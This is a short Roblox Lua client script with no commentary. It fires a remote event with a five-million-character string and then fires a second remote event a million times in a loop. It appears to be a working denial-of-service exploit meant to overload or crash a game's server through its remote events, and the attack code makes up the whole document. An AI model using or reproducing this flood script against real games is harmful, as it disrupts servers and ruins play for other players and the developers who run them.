local RS = game:GetService("ReplicatedStorage")

local UpdTextures = RS.DataEvents.UpdateTexturesChoice
UpdTextures:FireServer(string.rep("A", 5e6))

local DataRemote = RS.DataEvents.DataRemoteEvent
for _ = 1, 1e6 do
    DataRemote:FireServer()
end
